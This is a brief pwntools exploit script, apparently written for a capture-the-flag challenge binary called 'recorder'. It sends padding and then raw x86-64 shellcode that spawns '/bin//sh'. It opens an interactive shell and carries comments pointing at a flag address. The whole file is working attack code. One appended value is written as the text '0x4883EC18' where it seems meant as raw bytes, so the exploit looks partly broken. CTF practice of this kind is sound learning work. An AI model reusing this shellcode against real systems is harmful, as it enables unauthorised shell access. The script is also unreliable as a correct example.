from pwn import *

p = process('./recorder')
#r = remote('ctf.adl.tw', 11003) 
raw_input()

# p.recv()
# p.recvline()
# p.recvuntil()
p.send('aaaa')
p.send('\x50\x48\x31\xd2\x48\x31\xf6\x48\xbb\x2f\x62\x69\x6e\x2f\x2f\x73\x68\x53\x54\x5f\xb0\x3b\x0f\x05' + '0x4883EC18' )
							
# p.sendline()
# p.sendafter()

p.interactive()

#first input
#1. 0x0
#2. 0x601048 --> (flag)
#3. 0x4

